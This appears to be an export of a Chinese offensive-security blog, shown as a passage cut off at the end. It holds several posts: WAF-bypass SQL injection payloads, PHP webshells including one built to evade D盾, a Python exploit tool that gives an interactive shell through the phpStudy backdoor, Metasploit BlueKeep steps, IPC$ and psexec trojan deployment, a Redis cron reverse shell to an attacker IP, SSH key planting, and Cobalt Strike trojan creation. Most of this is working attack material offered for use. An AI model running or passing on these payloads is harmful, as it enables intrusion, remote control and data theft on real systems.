    <content type="text"><![CDATA[实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返回数据 那来用来测试是否可以绕过安全狗1&#39; or 1=1%23被拦截1&#39;/0%23没有被拦截,返回空1&#39;/1%23没有被拦截,返回数据 第二步猜测有多少个字段 1231&apos; order 不拦截1&apos; by 不拦截1&apos; order by 拦截 可以用/*!10244by*/,来绕过,10244是通过fuzz得来的,图片的数字基本上都可以,可能大家想问为什么不用为什么不用/*!10244order*/呢,因为我没有成功。:(输入a&#39; order /*!10244by*/3%23,发现没有拦截 然后查看有效字段 1231&apos; union 不拦截1&apos; select 不拦截1&apos; union select 拦截 可以用/*!1024select*/来绕过输入1&#39; union /*!10244select*/ 1,2,3%23,发现没有被拦截然后爆数据库,因为他会匹配database()函数,所以database/**/(),不过这样也会被拦截,在看404大佬的bypass的时候是用hex(database/**/())来得到数据库名的16进制的,不过我测试发现用(database/**/())就可以了利用hex获取数据库的16进制直接获取数据库名 获取数据库表的信息输入 11&apos; union select 1,select group_concat(table_name) from information_schema.tables where table_schema=(database/**/()),3%23; 然后发现会被拦截,经过测试发现拦截的是information_schema这个关键字,我们可以加上``符号,来绕过 11&apos; union /*!10244select*/ 1,(select group_concat(table_name) from `information_schema`.tables where table_schema=(database/**/())),3%23 爆破列名 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and table_name=&apos;class&apos;),3%23 发现被拦截了,经过测试是在table_name=’class’这里被拦截,我们依然可以用``进行绕过。 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23 发现被拦截了,然后尝试吧class转换为hex在进行绕过 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=0x636c617373),3%23]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋ctf题目(1)]]></title>
    <url>%2F2019%2F10%2F09%2Fi%E6%98%A5%E7%A7%8Bctf(1)%2F</url>
    <content type="text"><![CDATA[百度杯CTF比赛 九月场(Upload)页面题目:页面写着可以你可以随意上传文件,那就上传一个普通的一句话木马 12&lt;?phpeval($_REQUEST['a']); 发现上传成功,然后点击上传成功发现没有解析,猜测有可能是过滤了php这个字符串,换成短标签试一下 123&lt;?eval($_REQUEST['a']);?&gt; 发现也没有被解析怀疑还有可能过滤了&lt;?符号,不过还可以用&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;,不过php被过滤了,可以换成PhP 123&lt;script language="PhP"&gt; eval($_REQUEST['a']);&lt;/script&gt; 空白页面,php有可能解析了,然后用蚁剑连接。连接成功,也找到了flag。 百度杯CTF比赛 九月场(Code)题目页面查看url,有可能是文件包含,然后右键查看源代码,发现结果base64加密尝试输入index.php,看看会不会被包含发现成功包含了,然后用base64去解密,代码如下:从代码的注释中发现了PhpStorm,所以怀疑是文件泄露发现返回了页面,在页面中发现了其他php文件(fl3g_ichuqiu.php,index.php,config.php)然后想这利用文件包含来包含fl3g_ichuqiu.php这个文件,可是因为index.php的正则不允许有任何的符号,但是他会把config转换为_这个符号所以构造这样的payload:fl3gconfigichuqiu.php然后进行base64解码,得到源码(代码比较多,就不截图了,直接贴出来) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');# 此函数用来获取随机的字符串function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') &#123; $hash = ''; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125;# 此函数是一个加密函数function encrypt($txt,$key)&#123; # 此循环用来把每个字符转换为ascii码然后+10然后在变成字符 for($i=0;$i&lt;strlen($txt);$i++)&#123; $tmp .= chr(ord($txt[$i])+10); &#125; $txt = $tmp; # 获取4个随机字符 $rnd=random(4); # 将4个随机支付与$key进行加密然后赋值给$key $key=md5($rnd.$key); $s=0; # 将$txt的每个字符与$key对应的字符进行加密。(如果$txt的长度是5,只会循环5次) for($i=0;$i&lt;strlen($txt);$i++)&#123; if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s]; &#125; # 将生成的随机字符与生成的加密字符进行拼接然后base64加密,并且将值返回 return base64_encode($rnd.$ttmp);&#125;function decrypt($txt,$key)&#123; # 先将输入进来的值进行解密 $txt=base64_decode($txt); # 因为$txt是由随机字符和密文组合起来的 # 所以前面4个字符是随机字符,$rnd取出随机字符 $rnd = substr($txt,0,4); # $txt取出密文 $txt = substr($txt,4); # 将随机字符与$key拼接,在进行md5加密 $key=md5($rnd.$key); $s=0; # 因为加密进行了异或处理,因为异或是可逆的, # 所以$txt的每个字符与$key的每个字符进行异或就可以得到$tmp的值 for($i=0;$i&lt;strlen($txt);$i++)&#123; if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s]; &#125; # 因为加密的时候对每个字符的ascii码进行了+10的操作 # 所以这里要将ascii码减10,在转换为字符 for($i=0;$i&lt;strlen($tmp);$i++)&#123; $tmp1 .= chr(ord($tmp[$i])-10); &#125; return $tmp1;&#125;# 对cookie里面的user这个值进行解密$username = decrypt($_COOKIE['user'],$key);# 如果解密的值是system则输出flagif ($username == 'system')&#123; echo $flag;&#125;else&#123; # 如果解密的信息不是system,则设置user的cookie,为guest加密后的内容 setcookie('user',encrypt('guest',$key)); echo "╮(╯▽╰)╭";&#125;?&gt; 在这个代码中,我们需要知道$key前6位的值,因为system长度为6所以在循环加密的时候,只会循环6次,所以知道$key的前面6位就可以了。然后else那个语句guest是5个字符,因为他是5个字符,所以可以通过这个来获取5个密文,还剩下1个密文就可以拿到flag了。解密代码 123456789101112131415161718192021222324252627282930313233343536373839#coding=utf-8# 1-14行通过异或得$key的前面5个字符guest = 'guest' # 对guest进行加密txt = ''# 对guest的每一个字符对应的ASCII码+10,然后转换对应字符for i in range(len(guest)): txt += chr(ord(guest[i])+10)# guest加密后的值,从cookie中获取cookie_guest = "WFlSShVLCh8a"# 因为加密的最后一步是加密base64加密所以这里要解密cookie_guest = cookie_guest.decode('base64')# 获取验证码,加密后的内容是由4位验证码和密文rnd = cookie_guest[:4]# 获取密文ttmp = cookie_guest[4:]key = ''# 通过异或获得$key的前面5个字符for i in range(len(guest)): key += chr(ord(ttmp[i]) ^ ord(txt[i]))# 下面是对system进行加密system = 'system'txt1 = ''# 将system的每一个字符对应的ASCII码+10,然后转换对应字符for i in range(len(system)): txt1 += chr(ord(system[i])+10)# 因为system是6位,需要6位的$key的内容,因为我们知道了$key的前面5个# 所以这里用来爆破,这里是1-f的原因是因为md5加密后的内容是1-fmd5 = '0123456789abcdef'new_key = ''# 然后对system进行加密for i in range(len(md5)): # 生成新的md5值 new_key = key+md5[i] cookie_system='' for j in range(len(system)): # 每个字符进行加密 cookie_system += chr(ord(txt1[j]) ^ ord(new_key[j])) flag = rnd + cookie_system print(flag.encode('base64').strip()) 然后把输出的值复制下来,然后用burp对cookie中的user进行爆破]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpsutdy后门复现]]></title>
    <url>%2F2019%2F09%2F24%2Fphpstudy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言phpstudy横空报出来了一个后门,通过网上的知道phpstudy2016、phpstudy2018的部分版本存在这个后门,请大家尽快修复此漏洞。(博主也中招,我的是php5.2.17和php5.4.45这2个版本) 漏洞利用攻击包如下 1234567891011GET /phpinfo.php HTTP/1.1Host: 172.16.80.119Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip,deflateaccept-charset:c3lzdGVtKCdjYWxjJyk7Accept-Language: zh-CN,zh;q=0.9Connection: close 其中主要是修改Accept-Encoding和添加accept-charset这2个头文件,Accept-Encoding这个头文件中gzip,deflate这2个单词中间后面不可以有空格。然后accept-charset这个头文件传输的是payload,pyaload是结果php的代码在加上base64加密发送 工具小菜鸡一般的我,写了一个简单的脚本。大佬们勿喷!!!,只支持python3!!!脚本如果有问题记得联系本人QQ:2804745224 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#author:错空#time: 2019-09-24import threadingimport requestsimport base64import reimport optparse&quot;&quot;&quot;此函数是用来弄一个交互式的shell的参数是目标的网站和执行的cmd命令&quot;&quot;&quot;def exp(url,cmd): cmd =&quot;echo &apos;&lt;iclby&gt;&apos;;system(&apos;&quot;+cmd+&quot;&apos;);echo &apos;&lt;/iclby&gt;&apos;;&quot; #设置payload,加一个自定义标签是为了后面正则容易匹配命令执行后的结果 cmd = base64.b64encode(cmd.encode(&apos;utf-8&apos;)) #对payload进行加密 header=&#123; #设置http头 &quot;accept-charset&quot;: cmd, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; url = url #设置目标 try: response = requests.get(url,headers=header, timeout=10,verify=False) except: print(&quot;[-]网站访问超时!!!&quot;) exit(0) if(response.status_code!=200): print(&quot;[-]网站响应状态码不是200&quot;) exit(0) r = re.compile(&quot;&lt;iclby&gt;(.*?)&lt;/iclby&gt;&quot;,re.S) #创建正则,为了匹配执行后的命令 result = re.search(r, response.text) if(result!=None): #判断返回后的命令函数是否为空 print(result.group(1).strip()) else: poc(url) #如果没有成功就调用漏洞验证的函数 exit(0)&quot;&quot;&quot;此函数是用来漏洞验证只有一个参数,用来接收目标网址&quot;&quot;&quot;def poc(url): url = url.strip() #因为要读取文件,为了保险起见去除空格,以保证准确性 header=&#123; #设置http头 &quot;accept-charset&quot;: &quot;ZWNobyAnaWxjYnloYWhhJzs=&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; try: response = requests.get(url, headers=header, timeout=5) except: print(&quot;[-]网站超时&quot;) exit(0) if(response.status_code!=200): print(&quot;[-]网站响应状态吗不是200&quot;) exit(0) text = response.text r = re.compile(&quot;ilc.*?yhaha&quot;,re.S) if(re.search(r,text)): print(&quot;[+]%s:存在php后门漏洞!&quot;%url) else: print(&quot;[-]不存在php后门漏洞!&quot;)def main(): parser = optparse.OptionParser(&quot;[*]Usage: 验证是否有漏洞-s加目标,漏洞利用-e加目标(exit退出交互),-f漏洞扫描,扫描文件&quot;) parser.add_option(&quot;-s&quot;,dest=&quot;scan&quot;,type=&quot;string&quot;,help=&quot;扫描是否存在漏洞&quot;) parser.add_option(&quot;-e&quot;,dest=&quot;shell&quot;,type=&quot;string&quot;,help=&quot;漏洞利用,交互式shell&quot;) parser.add_option(&quot;-f&quot;,dest=&quot;file&quot;,type=&quot;string&quot;,help=&quot;扫描文件里面的ip是否存在漏洞&quot;) (options, args) = parser.parse_args() scan = options.scan shell = options.shell d = options.file if(scan!=None): poc(scan) elif(shell!=None): result = input(&quot;请输入要执行的命令:\n&gt;&gt;&gt;&quot;) while(result != &quot;exit&quot;): exp(shell,result) result = input(&quot;&gt;&gt;&gt;&quot;) elif(d!=None): try: with open(d,&apos;r&apos;) as f: for i in f: threading.Thread(target=poc,args=(i,)).start() except FileNotFoundError: print(&quot;文件不存在,或者权限不够&quot;) else: print(parser.usage) main() 参考文章https://mp.weixin.qq.com/s/VuaJhp7vRkzEiE_8-6ecqA]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cve-2019-07-08]]></title>
    <url>%2F2019%2F09%2F08%2Fcve-2019-2708%2F</url>
    <content type="text"><![CDATA[试验环境exp下载:链接：https://pan.baidu.com/s/1ZdsFNikHnj73pMNVXpxf2Q 提取码：f58vhttps://github.com/rapid7/metasploit-framework/pull/12283/fileswidnow7靶机下载ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/Window7 sp1 IP:172.16.5.68kali msf(5.0.32) IP:172.16.5.88 拷贝exp,把利用代码拷贝到对应的文件,命令如下(如果目标已有文件,直接覆盖就可以了): 12345mv rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/mv rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/mv cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp/mv cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/ 然后运行msf如果遇到如下错误,就更新msf 开始试验use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset RHOSTS 172.16.5.68set LHOSTS 172.16.5.88set target 3exploit如果不成功多试验几次，可以改target的值如果报如下错误(那就自求多福了),说不定是网络问题。如果报如下错误,有可能是目录弄错了 server2008还在苦苦挣扎(蓝屏盖中盖) 参考链接https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=timeline&amp;isappinstalled=0http://www.nmd5.com/?p=409&amp;from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPC简单攻击]]></title>
    <url>%2F2019%2F09%2F01%2FIPC%24%E5%85%A5%E4%BE%B5%2F</url>
    <content type="text"><![CDATA[IPC$攻击与目标建立远程连接: 1net use \\172.16.5.1\ipc$ /u:administrator abc.123 利用msf生成后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.23 LPORT=777 -f exe &gt;&gt; ppp.exe 然后利用copy命令把木马放到目标(c$代表是c盘的意思) 1copy C:\ppp.exe \\172.16.5.1\c$ 设置msf监听 123set lhost 172.16.5.23 //设置监听的ipset lport 777 //设置监听的端口exploit //开始监听 查看目标时间(后面设置定时任务要用) 1net time \\172.16.5.1 设置定时任务 1at \\172.16.5.1 11:22 C:\ppp.exe //11:22是自己设置什么时候运行 C:\ppp.exe是运行的文件 等到设定的时间就会运行文件 使用psexec工具安装下载地址: https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec下载完成后直接把工具复制到cmd的目录下第一次运行时候弹出一个框点击access就可以了 msf设置监听与上面一样然后运行命令: 1psexec \\172.16.5.1 -u administrator -p abc.123 -c c:\ppp.exe -u:用户名-p:密码-c:本地的文件作用:把本地文件复制到目标然后运行(如果已有IPC连接可以不用-u和-p参数) 推荐文章https://blog.csdn.net/u010984552/article/details/54890187https://www.cnblogs.com/baocheng/p/4020685.html?utm_source=tuicool&amp;utm_medium=referral]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>IPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8/28(redis未授权,xctf)]]></title>
    <url>%2F2019%2F08%2F28%2Fredis%2F</url>
    <content type="text"><![CDATA[漏洞篇redis未授权访问漏洞利用环境搭建 步骤1:下载和安装 1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz$ cd redis-2.8.17$ make 步骤2:启动redis服务(在redis目录下运行下面命令) 123$ service iptables stop # 防止后面因为防火墙的原因连接不了redis$ cd src$ ./redis-server ../redis.conf #可以省略后面的../redis.conf,这样的话就是默认配置 启动页面如图: 攻击机也要安装redis和步骤1一样(不用做步骤2) 如果没有安装成功可以参考此文章 然后测试一下远程连接,在攻击远程目标的redis 1$ ./redis-cli -h 172.16.5.55 如图表示连接成功: 如果没有连接成功有可能是因为bind或者设置了密码设置成了127.0.0.1,可以更改配置文件 1$ vi redis.conf 可以在前面添加一个#或者把127.0.0.1改为0.0.0.0 如图: 在requirepass添加注释 如图: 漏洞利用ssh无密码连接 讲一下ssh无密码连接的思路 1.生成ssh公钥 2.把ssh公钥传入redis缓存里面 3.修改ssh公钥 4.把redis缓存修改为/root/.ssh/ 首先用nmap工具对目标进行扫描 画箭头那里Bind是0.0.0.0表示任意ip都可以连接 我们先生成一个ssh公钥 1$ ssh-keygen -t rsa 修改ssh公钥(为了防止公钥与其他数据连接在一起) 1(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt 把key.txt添加到缓冲区 1$ cat /root/key.txt | ./redis-cli -h 172.16.5.55 -x set xxx 远程连接redis然后修改配置,然后输入如下命令 1234$ ./redis-cli -h 172.16.5.55$ config set dir /root/.ssh$ config set dbfilename authorized_keys$ save 最后连接目标服务器 如果目标是存在弱密码的我们可以用hydra进行爆破先为目标设置一个密码: 1vi redis.conf 按照如下修改然后用hydra进行爆破hydra -P pass.txt redis://172.16.5.55还可以用msf进行爆破爆破成功得到密码后就可以连接了 nc反弹shell思路与上面相同更改redis存储的文件 具体命令如下先用nc监听端口远程连接redis进行配置 1234set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.5.23/666 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 过1分钟左右就可以看到shell已经反弹过来了 xctf(web)篇php2发现什么都没有,然后有工具来了一波爆破看到了个index.phps文件,然后访问看看发现了代码泄露,通过审计发现要满足以下条件才可以拿到flag 121.$_GET[&apos;id&apos;]!==&quot;admin&quot;2.$_GET[&apos;id&apos;]===&quot;admin&quot; 这样看起来很绕,他第一次判断是否等于admin,如果等于就输出并且退出,然后中间那里有一个urldecode(),然后在判断是否大于admin如果等于的话就输出flag。所以所有的关键就在urldecode()这个函数,这个函数是用来url解码的。所以我们可以对admin进行一次urldecode然后我们只用把a变成%61然后对%61进行编码就可以绕过了(因为浏览器默认会进行一次url编码,所以我们这里还要编码一次) unserialize3题目页面:看到class类和wakeup就想到了反序列化漏洞,__wakeup会在反序列化的时候执行他里面的代码,所以要想办法绕过wakeup这里,然后wakeup有一个漏洞就是在反序列化时他的对象属性个数的值大于真实个数的属性就会跳过wakeup去执行。例如:O:4:&quot;test&quot;:1:{s:4:&quot;flag&quot;;s:4:&quot;test&quot;;}我们把1改成2他就会跳过__wakeup。因为括号里面只有1个属性,但是我们在外面说有2个属性所以他就会跳过这样题目就很简单了先对代码进行序列化得到O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后把属性1变成属性2最后的payload是:O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后提交得到flag 一些好的文章c2:https://github.com/platdrag/UnblockableChainshttps://iwantmore.pizza/posts/dnscat2-over-doh.htmlhttps://www.freebuf.com/sectool/210450.html 面试技巧:https://github.com/FeeiCN/SecurityInterviewQuestions ThinkPHP漏洞:https://github.com/Mochazz/ThinkPHP-Vuln/ 工具:https://www.kitploit.com/2019/08/hacktronian-all-in-one-hacking-tool-for.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29https://www.kitploit.com/2019/08/iprotate-extension-for-burp-suite-which.html?m=1https://github.com/guimaizi/get_domain?from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>redis未授权</tag>
        <tag>资源分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wfuzz工具]]></title>
    <url>%2F2019%2F08%2F28%2Fwfuzz%2F</url>
    <content type="text"><![CDATA[wfuzz工具介绍wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试 wfuzz工具基本用法常用参数 12345678910111213141516171819202122232425262728293031323334要FUZZ的参数用FUZZ表示如果有3个就要这样第一个:FUZZ第二个:FUZ2Z第三个:FUZ3Z其他更多的参数以此类推payload的个数要与FUZZ的个数相等-c: 带颜色输出-z: payloads里面的参数(wfuzz -e payloads)常用的有 file,1.txt:加载1.txt文件,用文件内容作为payload range,1-10:代表用1到10作为payload list,1-2-3:代表用1,2,3作为参数。每个参数用-分割-d: 设置POST数据-b: 设置cookie头-H: 添加http头部-p: 代理(可以使用多个代理)-X: 请求方式-R: 设置递归深度-s: 设置超时时间-t: 设置线程-e: 编码-f: 保存–follow：遵循重定向--basic: Basic Auth下面的要设置多个值的话用,分割--hc: 不输出状态码等于你设置的状态码的响应包(比如设置为200,那就不会输出状态码等于200的包)--hl: 不输出行数等于你设置的行数的响应包--hw: 不输出字数等于你设置的字数的响应包--hh: 不输出字符数等于你设置的字符数的响应包--hs: 不输出响应包中包含你输入的字符串的响应包-sc: 输出状态码等于你设置的状态码的响应包--sl: 输出行数等于你设置的行数的响应包--sw: 输出字数等于你设置的字数的响应包--sh: 输出字符数等于你设置的字符数的响应包--ss: 输出响应包中包含你输入的字符串的响应包 界面介绍id:代表编号Response: 代表返回状态码(C=404代表返回404状态码)Lines: 代表返回的行数Word: 代表返回的字数Chars: 代表返回的字符数payload: 代表发出去的payload -c参数下面是一个无-c参数的$ wfuzz -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ一个有-c参数的wfuzz -c -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ -z参数把文件内容当做payloadwfuzz -c -z file,dir.txt http://172.16.5.2/FUZZ用rang来当做payloadwfuzz -c -z range,10-20 --hc 404 http://172.16.5.2/FUZZ用list来当做payloadwfuzz -c -z list,20-a-b-upload-login --hc 404 http://172.16.5.2/FUZZ -d设置POST数据wfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; http://172.16.5.2/ -b设置cookie设置2个cookie,其中一个是user还有一个是passwdwfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; -b &quot;user=test&quot; -b &quot;passwd=test&quot; http://172.16.5.2/设置多个cookie要用多个-b -X参数设置请求方法wfuzz -c -z list,GET-POST-HEAD -X FUZZ http://172.16.5.2/ -p设置代理wfuzz -c -z list,20-a-b-upload-login -p 127.0.0.1:SOCKS4,127.0.0.1:SOCKS5 http://172.16.5.2/ -t设置线程wfuzz -c -z list,20-a-b-upload-login -t 30 http://172.16.5.2/ 实用技巧爆破目录wfuzz -c -z file,dir.txt --sc 403,200,304 http://172.16.5.2/FUZZ 爆破文件wfuzz -c -z file,dir.txt --sc 200,304 http://172.16.5.2/FUZZ.php 爆破账号密码第一种爆破(一个字典对应一个字典)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php第二种爆破(一个字典中的一个值直接对应另外一个字典的所有值)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 保存文件保存html文件wfuzz -c -z file,dir.txt -f 1,html http://172.16.5.96/FUZZ 对payload加密 wfuzz -z list,a-b-c-admin,base64 -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 对cookie进行sql注入测试 wfuzz -z file,MSSQL.fuzz.txt -b &quot;sql=FUZZ&quot; http://172.16.5.96/login/login.php]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike(一)]]></title>
    <url>%2F2019%2F08%2F25%2Fcobaltstrike(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar 工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar第一次连接的服务器会显示服务端的SSL 证书的SHA256哈希值这个直接确定就可以了 如图: 然后点击连接就可以了 里面的目录就不介绍了,如果不懂的可以看https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikeji-ben-shi-yong/ji-ben-shi-yong-jie-shao.html 制作木马在制作木马之前先要创建一个监听器(类似msf的payload) 点击此按钮后点击add 然后进行配置 名字就是给监听器取的名字 payload反弹的方式(有beacon字符串的可以反弹到cs里面,有foreign可以用来把shell传递到其他工具) 主机:反弹到哪个ip上端口:反弹到的端口配置完成后点击save(遇到其他窗口点击确认就可以了) 如图代表添加成功: 然后制作木马 如图添加一个exe的木马 对木马进行配置, 监听器:选择自己生成监听器的名字输出:代表输出的格式然后点击Generate 运行该木马 派送一个shell给msf首先也要添加一个监听器 payload要选择foreign类型的主机填写是反弹到的ip端口填写反弹到的端口 配置完Cobalt Strike后配置msf 如图: 然后回到Cobalt Strike,右击目标选择增加会话 然后选择要派生给msf的那个监听器，在点Choose就可以了。 然后等个1分钟左右就可以看到msf收到了传递过来的shell 把msf的shell传递个Cobalt strike首先也要创建一个监听器,因为前面已经创建了一个名字为cs的监听器，所以我们这里直接使用那时候创建的那个监听器就可以了,然后我们对msf进行配置 先查看自己的session id 然后在对msf进行配置 然后就可以看到cobalt strike主机上线了]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常量过D盾]]></title>
    <url>%2F2019%2F08%2F03%2F%E5%B8%B8%E9%87%8F%E8%BF%87D%E7%9B%BE%2F</url>
    <content type="text"><![CDATA[常量过D盾1234567&lt;?php sprintf("123"); sprintf("123"); sprintf("123"); $a=$_GET['a']; define("Test", "$a",true); assert(TesT);]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shellcode分离免杀]]></title>
